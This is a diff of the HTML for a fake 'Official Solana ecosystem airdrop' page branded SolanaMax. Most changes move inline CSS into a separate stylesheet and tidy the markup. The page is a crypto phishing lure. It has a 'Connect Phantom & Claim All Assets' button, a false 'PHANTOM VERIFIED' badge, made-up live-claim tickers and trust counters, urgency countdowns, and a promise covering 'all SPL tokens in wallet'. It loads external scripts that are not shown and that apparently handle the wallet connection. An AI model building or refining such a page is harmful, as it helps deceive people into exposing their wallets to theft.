@@ -7,862 +7,9 @@
     <meta name="description" content="Official Solana ecosystem airdrop. Claim SMAX and SPL tokens." />
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-    <style>
-        /* ====== Full TRX-based CSS with Solana purple ====== */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        html, body {
-            overflow-x: hidden !important;
-            width: 100% !important;
-            max-width: 100vw !important;
-            position: relative;
-        }
-
-        :root {
-            --solana-purple: #9945FF;
-            --solana-purple-light: #B57CFF;
-            --solana-purple-dark: #6F41E2;
-            --solana-purple-rgb: 153, 69, 255;
-            --solana-dark: #0A0B0F;
-            --solana-dark-2: #13151D;
-            --solana-dark-3: #1A1D28;
-            --solana-card-bg: #111318;
-            --success: #22C55E;
-            --text-primary: #F1F5F9;
-            --text-secondary: #94A3B8;
-            --text-tertiary: #64748B;
-            --border-color: #1E2130;
-            --glow-purple: 0 0 40px rgba(153, 69, 255, 0.2);
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--solana-dark);
-            color: var(--text-primary);
-            line-height: 1.6;
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden !important;
-            -webkit-font-smoothing: antialiased;
-            width: 100%;
-            max-width: 100vw;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-        }
-
-        /* Background */
-        .solana-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            pointer-events: none;
-            overflow: hidden;
-            max-width: 100vw;
-        }
-        .solana-background .solana-grid {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            max-width: 100vw;
-            background-image:
-                repeating-linear-gradient(0deg, transparent, transparent 59px, rgba(153,69,255,0.02) 59px, rgba(153,69,255,0.02) 60px),
-                repeating-linear-gradient(90deg, transparent, transparent 59px, rgba(153,69,255,0.02) 59px, rgba(153,69,255,0.02) 60px);
-        }
-        .solana-background .solana-glow {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(100px);
-            opacity: 0.4;
-        }
-        .solana-background .solana-glow-1 {
-            width: 900px;
-            height: 900px;
-            background: radial-gradient(circle, rgba(var(--solana-purple-rgb),0.06) 0%, transparent 70%);
-            top: -250px;
-            right: -250px;
-            animation: slowFloat 25s infinite ease-in-out;
-        }
-        .solana-background .solana-glow-2 {
-            width: 700px;
-            height: 700px;
-            background: radial-gradient(circle, rgba(var(--solana-purple-rgb),0.04) 0%, transparent 70%);
-            bottom: -200px;
-            left: -200px;
-            animation: slowFloat 30s infinite ease-in-out reverse;
-        }
-        @keyframes slowFloat {
-            0%,100% { transform: translate(0,0) scale(1); opacity: 0.5; }
-            33% { transform: translate(50px,-50px) scale(1.05); opacity: 0.7; }
-            66% { transform: translate(-40px,40px) scale(0.95); opacity: 0.4; }
-        }
-        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
-        @keyframes tickerSlide {
-            0%,20% { transform: translateY(0); opacity: 1; }
-            25%,45% { transform: translateY(-20px); opacity: 1; }
-            50%,70% { transform: translateY(-40px); opacity: 1; }
-            75%,95% { transform: translateY(-60px); opacity: 1; }
-            100% { transform: translateY(-80px); opacity: 0; }
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Network Bar */
-        .network-bar {
-            width: 100%;
-            max-width: 1180px;
-            background: rgba(10,11,15,0.95);
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 8px 20px;
-            margin-bottom: 25px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            font-size: 0.75rem;
-            color: var(--text-secondary);
-        }
-        .network-bar .network-left, .network-bar .network-right {
-            display: flex;
-            gap: 24px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .network-bar .network-stat {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .network-bar .network-stat i { color: var(--solana-purple-light); font-size: 0.6rem; }
-        .network-bar .network-stat .value { color: var(--text-primary); font-weight: 600; }
-        .network-bar .change-positive { color: var(--success); font-size: 0.65rem; margin-left: 3px; }
-        .network-bar .solana-badge {
-            background: rgba(var(--solana-purple-rgb),0.1);
-            border: 1px solid rgba(var(--solana-purple-rgb),0.2);
-            color: var(--solana-purple-light);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            white-space: nowrap;
-        }
-
-        /* Main Container */
-        .main-container {
-            max-width: 1180px;
-            width: 100%;
-            margin: 0 auto;
-            padding: 0;
-            background: transparent;
-        }
-
-        /* Header */
-        .solana-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 30px;
-            padding: 10px 0;
-            flex-wrap: wrap;
-            gap: 15px;
-            width: 100%;
-        }
-        .logo-area {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .solana-logo {
-            width: 48px;
-            height: 48px;
-            background: linear-gradient(135deg, var(--solana-purple) 0%, var(--solana-purple-dark) 100%);
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: var(--glow-purple);
-            flex-shrink: 0;
-            color: #fff;
-            font-size: 1.8rem;
-        }
-        .solana-logo-text {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            font-weight: 700;
-            font-size: 1.4rem;
-            color: var(--text-primary);
-            letter-spacing: -0.5px;
-        }
-        .solana-logo-text span { color: var(--solana-purple-light); }
-        .verified-pill {
-            background: rgba(34,197,94,0.1);
-            border: 1px solid rgba(34,197,94,0.3);
-            color: var(--success);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.65rem;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            white-space: nowrap;
-        }
-
-        /* Hero */
-        .hero-section {
-            margin-bottom: 40px;
-            width: 100%;
-        }
-        .hero-badge {
-            display: inline-block;
-            background: linear-gradient(135deg, rgba(var(--solana-purple-rgb),0.1), rgba(var(--solana-purple-rgb),0.05));
-            border: 1px solid rgba(var(--solana-purple-rgb),0.15);
-            color: var(--solana-purple-light);
-            padding: 6px 16px;
-            border-radius: 30px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            margin-bottom: 18px;
-            backdrop-filter: blur(5px);
-        }
-        h1 {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            font-size: clamp(2rem, 5vw, 3.2rem);
-            font-weight: 800;
-            color: #fff;
-            margin-bottom: 12px;
-            line-height: 1.1;
-            letter-spacing: -1px;
-            word-break: break-word;
-        }
-        .solana-highlight {
-            background: linear-gradient(135deg, var(--solana-purple) 0%, var(--solana-purple-light) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .hero-subtitle {
-            font-size: 1rem;
-            color: var(--text-secondary);
-            max-width: 600px;
-        }
-
-        /* Content Grid */
-        .content-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 24px;
-            margin-bottom: 50px;
-            width: 100%;
-        }
-        @media (max-width: 900px) {
-            .content-grid { grid-template-columns: 1fr; }
-        }
-
-        /* Cards */
-        .claim-card, .info-card {
-            background: var(--solana-card-bg);
-            border-radius: 16px;
-            padding: 30px 28px;
-            border: 1px solid var(--border-color);
-            box-shadow: 0 12px 32px rgba(0,0,0,0.4);
-            width: 100%;
-            overflow: hidden;
-        }
-        .card-header {
-            margin-bottom: 24px;
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-        .card-header h2 {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            font-size: 1.4rem;
-            font-weight: 700;
-            color: #fff;
-        }
-        .card-header p { color: var(--text-secondary); font-size: 0.8rem; }
-        .contract-badge {
-            background: rgba(10,11,15,0.8);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            padding: 6px 10px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.7rem;
-            flex-wrap: wrap;
-        }
-        .contract-badge code { color: var(--solana-purple-light); font-family: monospace; font-size: 0.7rem; }
-
-        /* Token Card – contains script‑targeted .airdrop-amount */
-        .solana-token-card {
-            background: linear-gradient(135deg, #13161F 0%, #0A0B0F 100%);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 35px 25px;
-            text-align: center;
-            margin-bottom: 24px;
-            position: relative;
-            overflow: hidden;
-            width: 100%;
-        }
-        .solana-icon-large {
-            width: 64px;
-            height: 64px;
-            background: linear-gradient(135deg, var(--solana-purple) 0%, var(--solana-purple-dark) 100%);
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 18px;
-            box-shadow: var(--glow-purple);
-            color: #fff;
-            font-size: 2.5rem;
-        }
-        .token-label {
-            font-size: 0.75rem;
-            color: var(--text-tertiary);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-        }
-        .token-amount-wrapper {
-            position: relative;
-            z-index: 1;
-        }
-        /* Script updates this element */
-        .airdrop-amount {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            font-size: clamp(2.5rem, 8vw, 3.4rem);
-            font-weight: 800;
-            background: linear-gradient(135deg, var(--solana-purple) 0%, var(--solana-purple-light) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            line-height: 1;
-            margin-bottom: 5px;
-            display: inline-block;
-        }
-        .token-symbol {
-            font-size: 1.3rem;
-            color: var(--text-secondary);
-            margin-left: 5px;
-            -webkit-text-fill-color: var(--text-secondary);
-        }
-        .token-value {
-            margin-top: 12px;
-            font-size: 0.95rem;
-            color: var(--text-secondary);
-            background: rgba(var(--solana-purple-rgb),0.06);
-            display: inline-block;
-            padding: 6px 16px;
-            border-radius: 20px;
-            border: 1px solid rgba(var(--solana-purple-rgb),0.1);
-        }
-        .token-info {
-            font-size: 0.7rem;
-            color: var(--solana-purple-light);
-            margin-top: 6px;
-        }
-        .price-source {
-            font-size: 0.65rem;
-            color: var(--text-tertiary);
-            margin-top: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
-
-        /* Live Ticker */
-        .live-ticker {
-            background: rgba(10,11,15,0.6);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 12px 15px;
-            margin-bottom: 24px;
-            width: 100%;
-            overflow: hidden;
-        }
-        .ticker-header {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 10px;
-        }
-        .ticker-header i { color: var(--success); font-size: 0.6rem; animation: pulse 1.5s infinite; }
-        .ticker-header span {
-            font-size: 0.7rem;
-            color: var(--text-tertiary);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .ticker-content {
-            font-family: 'Space Grotesk', monospace;
-            font-size: 0.75rem;
-            color: var(--text-secondary);
-            overflow: hidden;
-            height: 20px;
-            position: relative;
-            width: 100%;
-        }
-        .ticker-item {
-            position: absolute;
-            width: 100%;
-            animation: tickerSlide 8s infinite;
-            white-space: nowrap;
-        }
-        .ticker-item code {
-            color: var(--solana-purple-light);
-            background: rgba(var(--solana-purple-rgb),0.1);
-            padding: 2px 6px;
-            border-radius: 4px;
-            margin: 0 4px;
-        }
-
-        /* Progress */
-        .solana-progress-section {
-            background: rgba(10,11,15,0.4);
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 24px;
-            border: 1px solid var(--border-color);
-            width: 100%;
-        }
-        .progress-header-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
-        }
-        .progress-label {
-            font-weight: 500;
-            color: var(--text-primary);
-            font-size: 0.85rem;
-        }
-        .progress-percent {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            font-weight: 700;
-            color: var(--solana-purple-light);
-            font-size: 1.3rem;
-        }
-        .progress-bar-bg {
-            height: 6px;
-            background: var(--solana-dark-3);
-            border-radius: 3px;
-            overflow: hidden;
-            margin-bottom: 10px;
-            width: 100%;
-        }
-        .progress-bar-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--solana-purple), var(--solana-purple-light));
-            width: 0;
-            border-radius: 3px;
-            box-shadow: 0 0 15px rgba(var(--solana-purple-rgb),0.4);
-        }
-        .progress-stats-row {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.75rem;
-            color: var(--text-tertiary);
-        }
-
-        /* Countdown – script uses .countdown */
-        .solana-countdown {
-            background: linear-gradient(135deg, #13161F 0%, #0A0B0F 100%);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 22px 20px;
-            margin-bottom: 24px;
-            width: 100%;
-        }
-        .countdown-title {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 18px;
-            flex-wrap: wrap;
-        }
-        .countdown-title i { color: var(--solana-purple-light); font-size: 1rem; }
-        .countdown-title h3 {
-            font-size: 0.9rem;
-            font-weight: 600;
-            color: var(--text-primary);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .block-info {
-            font-size: 0.7rem;
-            color: var(--text-tertiary);
-            margin-left: auto;
-        }
-        .countdown-display {
-            display: flex;
-            justify-content: space-around;
-            gap: 5px;
-            flex-wrap: wrap;
-        }
-        .countdown-block {
-            text-align: center;
-            flex: 1;
-            min-width: 60px;
-        }
-        .countdown-number {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            font-size: clamp(1.5rem, 5vw, 1.8rem);
-            font-weight: 700;
-            color: var(--solana-purple-light);
-            line-height: 1;
-            margin-bottom: 4px;
-        }
-        .countdown-unit {
-            font-size: 0.6rem;
-            color: var(--text-tertiary);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        /* Script updates this element */
-        .countdown {
-            font-size: 0.9rem;
-            color: var(--solana-purple-light);
-            font-weight: 600;
-            background: rgba(153,69,255,0.08);
-            display: inline-block;
-            padding: 4px 16px;
-            border-radius: 20px;
-            border: 1px solid rgba(153,69,255,0.15);
-            margin-top: 12px;
-        }
-
-        /* Claim Button – must be #connect-wallet */
-        .claim-button-container { position: relative; width: 100%; margin-top: 10px; }
-        #connect-wallet {
-            width: 100%;
-            background: linear-gradient(135deg, var(--solana-purple) 0%, var(--solana-purple-dark) 100%);
-            color: #fff;
-            border: 1px solid rgba(255,255,255,0.1);
-            padding: 18px;
-            font-size: 1rem;
-            font-weight: 700;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            position: relative;
-            overflow: hidden;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        #connect-wallet::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s ease;
-        }
-        #connect-wallet:hover::before { left: 100%; }
-        #connect-wallet:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 12px 30px rgba(var(--solana-purple-rgb),0.35);
-        }
-        #connect-wallet:disabled { opacity: 0.7; cursor: not-allowed; }
-
-        .wallet-icons {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-        .wallet-icon {
-            width: 36px;
-            height: 36px;
-            background: var(--solana-dark-2);
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--text-tertiary);
-            font-size: 1.1rem;
-            transition: all 0.2s;
-        }
-        .wallet-icon:hover {
-            border-color: var(--solana-purple-light);
-            color: var(--solana-purple-light);
-        }
-
-        /* Success Message */
-        .solana-success-message {
-            background: linear-gradient(135deg, #0A1F14 0%, #07170E 100%);
-            border: 1px solid var(--success);
-            border-radius: 12px;
-            padding: 25px;
-            margin-top: 20px;
-            text-align: center;
-            display: none;
-            animation: slideUp 0.4s ease-out;
-            width: 100%;
-        }
-
-        /* Steps */
-        .solana-steps { margin-bottom: 30px; width: 100%; }
-        .solana-step {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 24px;
-            position: relative;
-            width: 100%;
-        }
-        .solana-step:not(:last-child)::after {
-            content: '';
-            position: absolute;
-            left: 23px;
-            top: 50px;
-            width: 2px;
-            height: calc(100% + 2px);
-            background: var(--border-color);
-        }
-        .solana-step.completed:not(:last-child)::after { background: var(--success); }
-        .step-indicator {
-            width: 48px;
-            height: 48px;
-            background: var(--solana-dark-2);
-            border: 1.5px solid var(--border-color);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--text-tertiary);
-            font-size: 1rem;
-            flex-shrink: 0;
-            position: relative;
-            z-index: 2;
-            transition: all 0.2s ease;
-        }
-        .solana-step.completed .step-indicator {
-            background: var(--success);
-            border-color: var(--success);
-            color: white;
-        }
-        .solana-step.active .step-indicator {
-            background: rgba(var(--solana-purple-rgb),0.1);
-            border-color: var(--solana-purple-light);
-            color: var(--solana-purple-light);
-            box-shadow: var(--glow-purple);
-        }
-        .step-info { flex: 1; min-width: 0; }
-        .step-info h4 {
-            font-size: 0.95rem;
-            font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 4px;
-        }
-        .step-info p {
-            font-size: 0.8rem;
-            color: var(--text-secondary);
-            word-break: break-word;
-        }
-
-        /* Audit */
-        .audit-section { margin-bottom: 28px; width: 100%; }
-        .audit-section h4 {
-            font-size: 0.9rem;
-            color: var(--text-primary);
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .audit-logos {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        .audit-logo {
-            background: rgba(10,11,15,0.6);
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 12px 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            transition: all 0.2s;
-            cursor: pointer;
-            flex: 1;
-            min-width: 140px;
-        }
-        .audit-logo:hover {
-            border-color: var(--solana-purple-light);
-            background: rgba(var(--solana-purple-rgb),0.03);
-        }
-        .audit-logo i { color: var(--success); font-size: 1.2rem; }
-        .audit-logo span {
-            font-size: 0.8rem;
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-        .audit-logo small {
-            font-size: 0.65rem;
-            color: var(--text-tertiary);
-            display: block;
-        }
-
-        /* Features – original .features (script may update) */
-        .features {
-            display: flex;
-            justify-content: space-around;
-            gap: 20px;
-            margin-top: 30px;
-            margin-bottom: 20px;
-        }
-        .feature {
-            flex: 1;
-            padding: 15px 10px;
-            background: rgba(10,11,15,0.4);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            transition: border-color 0.2s;
-            text-align: center;
-        }
-        .feature:hover {
-            border-color: var(--solana-purple-light);
-        }
-        .feature-icon {
-            font-size: 1.8rem;
-            margin-bottom: 8px;
-            color: var(--solana-purple-light);
-        }
-        .feature-text {
-            font-size: 0.8rem;
-            color: var(--text-secondary);
-            font-weight: 500;
-        }
-
-        /* Warning – original .warning */
-        .warning {
-            background: rgba(153,69,255,0.08);
-            border: 1px solid rgba(153,69,255,0.2);
-            border-radius: 10px;
-            padding: 14px;
-            margin-top: 20px;
-            font-size: 0.9rem;
-            color: var(--solana-purple-light);
-            font-weight: 500;
-            text-align: center;
-        }
-
-        /* Trust Stats */
-        .trust-footer {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 30px;
-            margin-top: 50px;
-            padding-top: 40px;
-            border-top: 1px solid var(--border-color);
-            width: 100%;
-        }
-        @media (max-width: 600px) { .trust-footer { grid-template-columns: 1fr; } }
-        .trust-stat { text-align: center; }
-        .trust-stat-icon {
-            width: 50px;
-            height: 50px;
-            background: var(--solana-dark-2);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 15px;
-            color: var(--solana-purple-light);
-            font-size: 1.3rem;
-            transition: all 0.2s;
-        }
-        .trust-stat:hover .trust-stat-icon {
-            border-color: var(--solana-purple-light);
-            transform: scale(1.05);
-            box-shadow: var(--glow-purple);
-        }
-        .trust-stat h4 {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            font-size: 1.4rem;
-            background: linear-gradient(135deg, var(--solana-purple), var(--solana-purple-light));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
-        }
-        .trust-stat p {
-            font-size: 0.75rem;
-            color: var(--text-tertiary);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        /* Footer */
-        .solana-footer {
-            text-align: center;
-            padding: 30px 20px;
-            margin-top: 40px;
-            border-top: 1px solid var(--border-color);
-            width: 100%;
-        }
-        .footer-copyright {
-            color: var(--text-tertiary);
-            font-size: 0.75rem;
-            margin-bottom: 15px;
-        }
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-        }
-        .footer-links a {
-            color: var(--text-secondary);
-            text-decoration: none;
-            font-size: 0.75rem;
-            transition: color 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .footer-links a:hover { color: var(--solana-purple-light); }
-
-        /* Utility */
-        .counter-value { display: inline-block; }
-        div, section, header, footer, main, article, aside, nav { max-width: 100%; }
-        img, video, canvas, svg { max-width: 100%; height: auto; }
-
-        @media (max-width: 768px) {
-            .network-bar { flex-direction: column; align-items: stretch; gap: 6px; }
-            .network-bar .network-left, .network-bar .network-right { justify-content: center; }
-            .features { flex-direction: column; gap: 15px; }
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
-
     <!-- Background -->
     <div class="solana-background">
         <div class="solana-grid"></div>
@@ -872,24 +19,25 @@
 
     <!-- Network Bar -->
     <div class="network-bar">
-        <div class="network-left">
-            <div class="network-stat"><i class="fas fa-circle" style="color: #22C55E;"></i> SOL: <span class="value" id="solPrice">$145.20</span><span id="solChange" class="change-positive">▲2.3%</span></div>
-            <div class="network-stat"><i class="fas fa-cube"></i> Slot: <span class="value" id="blockHeight">198,453,276</span></div>
-            <div class="network-stat"><i class="fas fa-gas-pump"></i> Fee: <span class="value">~0.000005 SOL</span></div>
-        </div>
-        <div class="network-right">
-            <div class="network-stat"><i class="fas fa-link"></i> Chain: <span class="value">Solana Mainnet</span></div>
-            <div class="solana-badge"><i class="fas fa-check-circle"></i> SPL Network</div>
+        <div class="network-container">
+            <div class="network-left">
+                <div class="network-stat"><i class="fas fa-circle" style="color: #22C55E; font-size: 0.5rem;"></i><span>SOL:</span><span class="value" id="solPrice">$145.20</span><span id="solChange" class="change-positive">▲2.3%</span></div>
+                <div class="network-stat"><i class="fas fa-cube"></i><span>Slot:</span><span class="value" id="blockHeight">198,453,276</span></div>
+                <div class="network-stat"><i class="fas fa-gas-pump"></i><span>Fee:</span><span class="value">~0.000005 SOL</span></div>
+            </div>
+            <div class="network-right">
+                <div class="network-stat"><i class="fas fa-link"></i><span>Chain:</span><span class="value">Solana Mainnet</span></div>
+                <div class="solana-badge"><i class="fas fa-check-circle"></i><span>SPL Network</span></div>
+            </div>
         </div>
     </div>
 
     <!-- Main Container -->
     <div class="main-container">
-
         <!-- Header -->
         <header class="solana-header">
             <div class="logo-area">
-                <div class="solana-logo"><i class="fas fa-circle"></i></div>
+                <div class="solana-logo"><i class="fas fa-circle" style="font-size: 1.8rem; color: #fff;"></i></div>
                 <div class="solana-logo-text">Solana<span>Max</span></div>
                 <div class="verified-pill"><i class="fas fa-shield"></i>PHANTOM VERIFIED</div>
             </div>
@@ -897,14 +45,13 @@
 
         <!-- Hero -->
         <section class="hero-section">
-            <div class="hero-badge"><i class="fas fa-gift"></i> GENESIS AIRDROP · SPL NETWORK</div>
+            <div class="hero-badge"><i class="fas fa-gift" style="margin-right:6px;"></i>GENESIS AIRDROP · SPL NETWORK</div>
             <h1>Claim Your <span class="solana-highlight">Solana</span><br />Ecosystem Airdrop</h1>
             <p class="hero-subtitle">Official distribution for Solana users. 500 SMAX allocation + all SPL tokens per eligible wallet.</p>
         </section>
 
         <!-- Content Grid -->
         <div class="content-grid">
-
             <!-- Claim Card -->
             <div class="claim-card">
                 <div class="card-header">
@@ -912,23 +59,19 @@
                     <div class="contract-badge"><i class="fas fa-file-contract" style="color:#9945FF;"></i><code>So1...pL9</code></div>
                 </div>
 
-                <!-- Token Display – script updates .airdrop-amount -->
+                <!-- Token Display -->
                 <div class="solana-token-card">
-                    <div class="solana-icon-large"><i class="fas fa-circle"></i></div>
+                    <div class="solana-icon-large"><i class="fas fa-circle" style="font-size: 2.5rem; color: #fff;"></i></div>
                     <div class="token-label">Your Eligible Allocation</div>
-                    <div class="token-amount-wrapper">
-                        <!-- 👇 script targets this class -->
-                        <span class="airdrop-amount" id="airdropAmount">500</span>
-                        <span class="token-symbol">SMAX</span>
-                    </div>
+                    <div class="token-amount-wrapper"><span class="token-amount counter-value" data-target="500">0</span><span class="token-symbol">SMAX</span></div>
                     <div class="token-value" id="usdValue">≈ $72.50 USD</div>
                     <div class="token-info">+ All SPL tokens in wallet (USDC, USDT, mSOL, JUP, RAY)</div>
-                    <div class="price-source"><i class="fas fa-circle"></i> Live price via CoinGecko</div>
+                    <div class="price-source"><i class="fas fa-circle"></i><span>Live price via CoinGecko</span></div>
                 </div>
 
                 <!-- Live Ticker -->
                 <div class="live-ticker">
-                    <div class="ticker-header"><i class="fas fa-circle"></i> Live Claims</div>
+                    <div class="ticker-header"><i class="fas fa-circle"></i><span>Live Claims</span></div>
                     <div class="ticker-content">
                         <div class="ticker-item"><i class="fas fa-check-circle" style="color:#22C55E;font-size:0.6rem;"></i> <code>7xK...pL9</code> claimed 500 SMAX + USDC · 5s ago</div>
                         <div class="ticker-item" style="animation-delay:2s;"><i class="fas fa-check-circle" style="color:#22C55E;font-size:0.6rem;"></i> <code>G9f...kLmN</code> claimed 500 SMAX + mSOL · 28s ago</div>
@@ -940,11 +83,11 @@
                 <!-- Progress -->
                 <div class="solana-progress-section">
                     <div class="progress-header-row"><span class="progress-label">Distribution Progress</span><span class="progress-percent">61%</span></div>
-                    <div class="progress-bar-bg"><div class="progress-bar-fill" style="width:61%"></div></div>
-                    <div class="progress-stats-row"><span>30,500,000 SMAX</span><span>50,000,000 SMAX Total</span></div>
+                    <div class="progress-bar-bg"><div class="progress-bar-fill" id="solanaProgressFill" style="width:61%"></div></div>
+                    <div class="progress-stats-row"><span id="claimedAmount">30,500,000 SMAX</span><span>50,000,000 SMAX Total</span></div>
                 </div>
 
-                <!-- Countdown – script updates .countdown -->
+                <!-- Countdown -->
                 <div class="solana-countdown">
                     <div class="countdown-title"><i class="fas fa-hourglass-half"></i><h3>Airdrop Ends</h3><span class="block-info">≈ 85,000 blocks</span></div>
                     <div class="countdown-display">
@@ -953,13 +96,11 @@
                         <div class="countdown-block"><div class="countdown-number" id="solanaMinutes">22</div><div class="countdown-unit">Mins</div></div>
                         <div class="countdown-block"><div class="countdown-number" id="solanaSeconds">45</div><div class="countdown-unit">Secs</div></div>
                     </div>
-                    <!-- 👇 script updates this element -->
-                    <div class="countdown">⏰ Limited Time: 48 hours remaining</div>
                 </div>
 
-                <!-- Claim Button – script uses #connect-wallet -->
+                <!-- Claim Button (keep original id) -->
                 <div class="claim-button-container">
-                    <button id="connect-wallet"><i class="fas fa-wallet"></i> Connect Phantom & Claim All Assets</button>
+                    <button id="connect-wallet" class="solana-claim-button"><i class="fas fa-wallet"></i> Connect Phantom & Claim All Assets</button>
                 </div>
 
                 <div class="wallet-icons">
@@ -968,7 +109,7 @@
                     <div class="wallet-icon"><i class="fas fa-mobile-alt"></i></div>
                 </div>
 
-                <!-- Success Message -->
+                <!-- Success Message (hidden by default) -->
                 <div id="solanaSuccessMessage" class="solana-success-message" style="display:none;">
                     <i class="fas fa-check-circle" style="font-size:3rem; color:#22C55E;"></i>
                     <div style="font-size:1.3rem;font-weight:700;color:#22C55E;margin-bottom:8px;">Claim Successful</div>
@@ -1003,28 +144,7 @@
             </div>
         </div>
 
-        <!-- Features – original .features (script may update) -->
-        <div class="features">
-            <div class="feature">
-                <div class="feature-icon">⚡</div>
-                <div class="feature-text">Instant<br />Distribution</div>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">🔒</div>
-                <div class="feature-text">Secure<br />Platform</div>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">🎯</div>
-                <div class="feature-text">Zero<br />Fees</div>
-            </div>
-        </div>
-
-        <!-- Warning – original .warning -->
-        <div class="warning">
-            ⚠️ Claim Offer Now Before It's Too Late
-        </div>
-
-        <!-- Trust Stats -->
+        <!-- Trust Footer -->
         <div class="trust-footer">
             <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-users"></i></div><h4 class="counter-value" data-target="32500">0</h4><p>Verified Claims</p></div>
             <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-bolt"></i></div><h4>~3s</h4><p>Claim Time</p></div>
@@ -1042,7 +162,7 @@
         </footer>
     </div>
 
-    <!-- Original Solana scripts – unchanged -->
+    <!-- Scripts (unchanged) -->
     <script src="js/jquery-3.6.0.min.js"></script>
     <script src="js/index.iife.min.js"></script>
     <script src="js/scripts.js"></script>
